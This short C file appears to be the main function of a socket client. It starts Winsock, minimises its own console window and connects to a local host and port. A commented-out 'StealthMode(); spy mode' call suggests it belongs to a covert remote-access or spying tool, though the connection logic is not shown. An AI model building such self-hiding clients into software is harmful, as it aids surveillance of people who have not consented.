#include "head.h"


int main(int argc, char ** argv){
    
    //StealthMode(); spy mode

    if (WSAinit()){
        exit(1);
    }
    
    #ifdef _WIN32 
    ShowWindow(GetConsoleWindow(), SW_MINIMIZE);
    #endif

    socktype sock = processClientSocket(LOCALHOST, PORT);

    cleanupClient(sock);

    return 0;
}